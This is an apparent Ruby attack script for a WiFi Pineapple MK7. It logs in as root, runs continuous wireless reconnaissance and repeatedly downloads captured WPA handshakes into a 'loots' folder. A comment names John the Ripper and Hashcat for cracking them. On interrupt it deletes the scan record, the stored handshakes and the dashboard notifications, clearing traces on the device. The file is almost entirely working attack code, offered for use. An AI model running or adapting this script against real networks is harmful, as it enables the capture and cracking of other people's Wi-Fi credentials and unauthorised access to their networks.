require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    # SETUP
    #
    led.setup

    reset_settings = PineappleMK7::Modules::PineAP::Settings.new
    reset_settings.save

    recon_scanning = PineappleMK7::Modules::Recon::Scanning.new
    INTERVAL = 10

    recon_handshakes = PineappleMK7::Modules::Recon::Handshakes.new
    HANDSHAKES_DESTINATION = './loots/'

    dashboard_notifications = PineappleMK7::Modules::Dashboard::Notifications.new

    # ATTACK
    #
    led.attack

    scanID = (recon_scanning.start_continuous(true)).scanID

    begin

        captured_handshakes = []

        loop do

            sleep(INTERVAL)

            $stdout.clear_screen

            # SPECIAL
            #
            led.special

            puts('[+] Captured WPA Handshakes')

            (recon_handshakes.output).each do |handshake|

                location = handshake.location

                if (!captured_handshakes.include?(location))
                    handshake_path = recon_handshakes.download(handshake, HANDSHAKES_DESTINATION)
                    # John the Ripper, Hashcat, ... actions
                    captured_handshakes.push(location)
                end
                
            end

            pp(captured_handshakes)

            # ATTACK 2
            #
            led.attack

        end

    rescue Interrupt

        puts('[-] Interrupt Signal')

        # FINISH
        #
        led.finish

        recon_scanning.stop_continuous

        # CLEANUP
        #
        led.cleanup

        recon_scanning.delete(scanID)
        recon_handshakes.clear
        dashboard_notifications.clear

        # OFF
        #
        led.off

    end
  
end